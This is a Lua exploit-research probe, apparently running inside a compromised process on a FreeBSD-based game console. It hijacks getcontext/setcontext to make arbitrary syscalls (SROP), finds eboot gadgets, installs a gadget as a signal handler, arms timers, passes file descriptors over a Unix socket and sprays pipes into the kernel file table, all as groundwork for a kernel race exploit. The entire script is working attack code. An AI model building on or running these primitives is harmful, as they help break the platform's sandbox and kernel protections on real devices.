-- CRASH_CLASS: MODERATE
-- PROBE 159a: Signal-based race + SCM_RIGHTS fd passing
--
-- New primitives discovered: AF_UNIX socketpair, loopback TCP, sendfile
-- This probe tests:
-- A) sigaction(416) — can we set signal handlers?
-- B) setitimer(83) — can we arm timers?
-- C) SCM_RIGHTS — pass fds over unix socket
-- D) If signals work: race a blocking syscall against a signal that closes an fd
-- E) Pipe buffer kernel pointer scan after fd passing

print("=== PROBE 159a: SIGNAL RACE + SCM_RIGHTS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local function eb(off) return uint64(string.format("0x%X%08X", text_hi, text_lo + off)) end
print("eboot=0x" .. string.format("%X%08X", text_hi, text_lo))

-- Gadgets
local ret_gadget = eb(0x42)  -- ret

-- [A] Test sigaction(416)
print("")
print("--- [A] SIGACTION TEST ---")

-- struct sigaction:
--   sa_handler(8) sa_flags(4) sa_mask(16)
-- Total = 28 bytes (aligned to 32)
-- SA_SIGINFO = 0x40
-- SA_RESTART = 0x02

local SA = gpu + 0x10000
local OSA = gpu + 0x10100

-- First: query current handler for SIGALRM(14) with sa=NULL, osa=output
for off = 0, 0xFF, 4 do wd(OSA + off, 0) end
local sa1 = srop(416, uint64(14), uint64(0), ga(0x10100))
local sa1v = sa1 and to_num(sa1) or -999
print("sigaction(SIGALRM, query)=" .. sa1v)
if sa1v == 0 then
    local handler = rq(OSA)
    local hh, hl = get_hi_lo(handler)
    local flags = rd(OSA + 8)
    print("  current_handler=0x" .. string.format("%X%08X", hh, hl))
    print("  flags=0x" .. string.format("%X", flags))
end

-- Try to set SIGALRM handler to our ret gadget
-- This won't actually run meaningful code but tests if sigaction is allowed
for off = 0, 0x3F, 4 do wd(SA + off, 0) end
wq(SA, ret_gadget)  -- sa_handler = ret gadget in eboot
wd(SA + 8, 0x46)  -- SA_SIGINFO|SA_RESTART|SA_NODEFER

local sa2 = srop(416, uint64(14), ga(0x10000), ga(0x10100))
local sa2v = sa2 and to_num(sa2) or -999
print("sigaction(SIGALRM, set)=" .. sa2v)

-- Also try USR1(30), USR2(31), SIGCHLD(20)
for _, sig in ipairs({30, 31, 20}) do
    local sn = srop(416, sig, ga(0x10000), uint64(0))
    local snv = sn and to_num(sn) or -999
    print("sigaction(sig=" .. sig .. ")=" .. snv)
end

-- [B] Test setitimer(83)
print("")
print("--- [B] SETITIMER ---")

-- struct itimerval: interval(timeval=16), value(timeval=16) = 32 bytes
-- timeval: tv_sec(8) tv_usec(8) on amd64 FreeBSD
local IT = gpu + 0x11000
local OIT = gpu + 0x11100

-- Query current ITIMER_REAL(0)
for off = 0, 0x3F, 4 do wd(OIT + off, 0) end
local it1 = srop(83, uint64(0), uint64(0), ga(0x11100))
local it1v = it1 and to_num(it1) or -999
print("getitimer(REAL)=" .. it1v)
if it1v == 0 then
    local intv_s = rd(OIT)
    local intv_us = rd(OIT + 8)
    local val_s = rd(OIT + 16)
    local val_us = rd(OIT + 24)
    print("  interval=" .. intv_s .. "s " .. intv_us .. "us")
    print("  value=" .. val_s .. "s " .. val_us .. "us")
end

-- Set a very short timer (100ms one-shot)
for off = 0, 0x1F, 4 do wd(IT + off, 0) end
-- interval = 0 (one-shot)
-- value = 0 sec, 100000 usec (100ms)
wq(IT + 16, uint64(0))  -- value.tv_sec = 0
wq(IT + 24, uint64(100000))  -- value.tv_usec = 100000

local it2 = srop(83, uint64(0), ga(0x11000), ga(0x11100))
local it2v = it2 and to_num(it2) or -999
print("setitimer(100ms)=" .. it2v)

-- Immediately cancel it to avoid killing ourselves
for off = 0, 0x1F, 4 do wd(IT + off, 0) end
srop(83, uint64(0), ga(0x11000), uint64(0))

-- [C] SCM_RIGHTS — pass file descriptors over unix socket
print("")
print("--- [C] SCM_RIGHTS FD PASSING ---")

-- Create socketpair
local svp = gpu + 0x20000
wd(svp, 0)
wd(svp + 4, 0)
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x20000))
local spv = sp and to_num(sp) or -999
print("socketpair=" .. spv)

if spv == 0 then
    local ux0 = rd(svp)
    local ux1 = rd(svp + 4)
    print("unix_fds: " .. ux0 .. ", " .. ux1)

    -- Create a pipe to pass
    local pipe_rd_rv = srop(42)
    local pipe_rd = pipe_rd_rv and to_num(pipe_rd_rv) or -1
    local pipe_wr = pipe_rd + 1
    print("pipe: " .. pipe_rd .. ", " .. pipe_wr)

    if pipe_rd >= 0 then
        -- Send pipe_rd via SCM_RIGHTS
        local MSG = gpu + 0x21000
        local IOV = gpu + 0x22000
        local DATA = gpu + 0x23000
        local CMSG = gpu + 0x24000

        wd(DATA, 0x42)  -- one byte payload
        wq(IOV, ga(0x23000))  -- iov_base
        wq(IOV + 8, uint64(1))  -- iov_len

        -- SCM_RIGHTS cmsg: contains the fd as an int
        -- cmsg_len = sizeof(cmsghdr) + sizeof(int) = 12 + 4 = 16
        -- On amd64: CMSG_LEN = CMSG_ALIGN(sizeof(cmsghdr)) + datalen
        -- CMSG_ALIGN rounds to 8-byte boundary
        -- sizeof(cmsghdr) = 12 on FreeBSD amd64, CMSG_ALIGN(12) = 16
        -- So cmsg_len for one fd: 16 + 4 = 20? No, cmsg_len is the unaligned length.
        -- Actually, cmsg_len = sizeof(struct cmsghdr) + sizeof(int) = 12 + 4 = 16
        wd(CMSG, 16)  -- cmsg_len
        wd(CMSG + 4, 0xFFFF)  -- SOL_SOCKET
        wd(CMSG + 8, 1)  -- SCM_RIGHTS
        wd(CMSG + 12, pipe_rd)  -- the fd to pass

        for off = 0, 0x3F, 4 do wd(MSG + off, 0) end
        wq(MSG + 16, ga(0x22000))  -- msg_iov
        wd(MSG + 24, 1)  -- msg_iovlen
        wq(MSG + 32, ga(0x24000))  -- msg_control
        wd(MSG + 40, 20)  -- msg_controllen (padded)

        local sm = srop(28, uint64(ux0), ga(0x21000), uint64(0))
        local smv = sm and to_num(sm) or -999
        print("sendmsg(SCM_RIGHTS)=" .. smv)

        -- Receive on ux1
        local RMSG = gpu + 0x25000
        local RIOV = gpu + 0x26000
        local RDATA = gpu + 0x27000
        local RCMSG = gpu + 0x28000
        for off = 0, 0xFF, 4 do wd(RCMSG + off, 0) end
        wd(RDATA, 0)
        wq(RIOV, ga(0x27000))
        wq(RIOV + 8, uint64(4))
        for off = 0, 0x3F, 4 do wd(RMSG + off, 0) end
        wq(RMSG + 16, ga(0x26000))
        wd(RMSG + 24, 1)
        wq(RMSG + 32, ga(0x28000))
        wd(RMSG + 40, 256)

        local rm = srop(27, uint64(ux1), ga(0x25000), uint64(0))
        local rmv = rm and to_num(rm) or -999
        print("recvmsg(SCM_RIGHTS)=" .. rmv)

        if rmv > 0 or rmv == 0 then
            local clen = rd(RCMSG)
            local clev = rd(RCMSG + 4)
            local ctyp = rd(RCMSG + 8)
            print("cmsg: len=" .. clen .. " level=0x" .. string.format("%X", clev) ..
                " type=" .. ctyp)

            if ctyp == 1 then
                -- SCM_RIGHTS — received fd
                local recv_fd = rd(RCMSG + 12)
                print("received_fd=" .. recv_fd)

                -- Verify: write through pipe_wr, read from recv_fd
                wd(gpu + 0x29000, 0xDEADBEEF)
                srop(4, uint64(pipe_wr), ga(0x29000), uint64(4))
                wd(gpu + 0x29100, 0)
                local nr = srop(3, uint64(recv_fd), ga(0x29100), uint64(4))
                local nrv = nr and to_num(nr) or -999
                local rval = rd(gpu + 0x29100)
                print("pipe_through_passed_fd: read=" .. nrv ..
                    " val=0x" .. string.format("%08X", rval))

                if rval == 0xDEADBEEF then
                    print("*** SCM_RIGHTS FD PASSING WORKS ***")
                end

                -- Now try the race: close original pipe_rd while recv_fd is still open
                -- This creates two references to the same file struct
                -- Close original: reduces refcount to 1 (recv_fd still holds it)
                srop(6, uint64(pipe_rd))
                pipe_rd = -1  -- mark as closed

                -- Verify recv_fd still works after original close
                wd(gpu + 0x29000, 0xCAFEBABE)
                srop(4, uint64(pipe_wr), ga(0x29000), uint64(4))
                wd(gpu + 0x29100, 0)
                nr = srop(3, uint64(recv_fd), ga(0x29100), uint64(4))
                nrv = nr and to_num(nr) or -999
                rval = rd(gpu + 0x29100)
                print("after_close_original: read=" .. nrv ..
                    " val=0x" .. string.format("%08X", rval))

                -- [D] Mass fd passing — stress the kernel fd table
                print("")
                print("--- [D] FD SPRAY VIA SCM_RIGHTS ---")

                -- Create many pipes and pass them all
                local spray_fds = {}
                for i = 1, 50 do
                    local prd = srop(42)
                    local pv = prd and to_num(prd) or -1
                    if pv < 0 then
                        print("pipe spray stopped at " .. i)
                        break
                    end
                    spray_fds[i] = {pv, pv + 1}
                end
                print("spray_pipes=" .. #spray_fds)

                -- Pass all read fds via SCM_RIGHTS in one big cmsg
                -- Max fds per SCM_RIGHTS message varies; try batches of 10
                local batch = math.min(10, #spray_fds)
                wd(CMSG, 12 + batch * 4)  -- cmsg_len
                wd(CMSG + 4, 0xFFFF)  -- SOL_SOCKET
                wd(CMSG + 8, 1)  -- SCM_RIGHTS
                for i = 1, batch do
                    wd(CMSG + 12 + (i-1)*4, spray_fds[i][1])
                end

                wd(DATA, 0x43)
                for off = 0, 0x3F, 4 do wd(MSG + off, 0) end
                wq(MSG + 16, ga(0x22000))
                wd(MSG + 24, 1)
                wq(MSG + 32, ga(0x24000))
                wd(MSG + 40, 12 + batch * 4 + 4)

                sm = srop(28, uint64(ux0), ga(0x21000), uint64(0))
                smv = sm and to_num(sm) or -999
                print("batch_send(" .. batch .. " fds)=" .. smv)

                -- Receive the batch
                for off = 0, 0xFF, 4 do wd(RCMSG + off, 0) end
                wd(RDATA, 0)
                for off = 0, 0x3F, 4 do wd(RMSG + off, 0) end
                wq(RMSG + 16, ga(0x26000))
                wd(RMSG + 24, 1)
                wq(RMSG + 32, ga(0x28000))
                wd(RMSG + 40, 256)
                rm = srop(27, uint64(ux1), ga(0x25000), uint64(0))
                rmv = rm and to_num(rm) or -999
                clen = rd(RCMSG)
                ctyp = rd(RCMSG + 8)
                print("batch_recv=" .. rmv .. " cmsg_len=" .. clen .. " type=" .. ctyp)

                if ctyp == 1 and clen > 12 then
                    local nfds = (clen - 12) / 4
                    print("received " .. nfds .. " fds")
                    for i = 0, math.min(nfds - 1, 9) do
                        local rfd = rd(RCMSG + 12 + i * 4)
                        print("  recv_fd[" .. i .. "]=" .. rfd)
                    end
                end

                -- Cleanup spray
                for i = 1, #spray_fds do
                    srop(6, uint64(spray_fds[i][1]))
                    srop(6, uint64(spray_fds[i][2]))
                end

                srop(6, uint64(recv_fd))
            end
        end

        if pipe_rd >= 0 then srop(6, uint64(pipe_rd)) end
        srop(6, uint64(pipe_wr))
    end

    srop(6, uint64(ux0))
    srop(6, uint64(ux1))
end

-- [E] sigaltstack test
print("")
print("--- [E] SIGALTSTACK ---")
-- Can we set up an alternate signal stack?
-- sigaltstack(53): int sigaltstack(const stack_t *ss, stack_t *oss)
-- stack_t: ss_sp(8) ss_size(8) ss_flags(4)
local SS = gpu + 0x30000
local OSS = gpu + 0x30100

-- Query current
for off = 0, 0x1F, 4 do wd(OSS + off, 0) end
local ss1 = srop(53, uint64(0), ga(0x30100))
local ss1v = ss1 and to_num(ss1) or -999
print("sigaltstack(query)=" .. ss1v)
if ss1v == 0 then
    local sp_ptr = rq(OSS)
    local sp_sz = rq(OSS + 8)
    local sp_flags = rd(OSS + 16)
    local sph, spl = get_hi_lo(sp_ptr)
    local szh, szl = get_hi_lo(sp_sz)
    print("  sp=0x" .. string.format("%X%08X", sph, spl) ..
        " size=0x" .. string.format("%X%08X", szh, szl) ..
        " flags=0x" .. string.format("%X", sp_flags))
end

-- Set up alt stack on a mapped page
local alt_stack = srop(477, uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
local ash, asl = get_hi_lo(alt_stack)

if ash ~= 0xFFFFFFFF then
    wq(SS, alt_stack)  -- ss_sp
    wq(SS + 8, uint64(0x10000))  -- ss_size
    wd(SS + 16, 0)  -- ss_flags (0 = enable)

    local ss2 = srop(53, ga(0x30000), ga(0x30100))
    local ss2v = ss2 and to_num(ss2) or -999
    print("sigaltstack(set)=" .. ss2v)

    -- Verify
    for off = 0, 0x1F, 4 do wd(OSS + off, 0) end
    srop(53, uint64(0), ga(0x30100))
    local new_sp = rq(OSS)
    local nsh, nsl = get_hi_lo(new_sp)
    print("  new_sp=0x" .. string.format("%X%08X", nsh, nsl))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
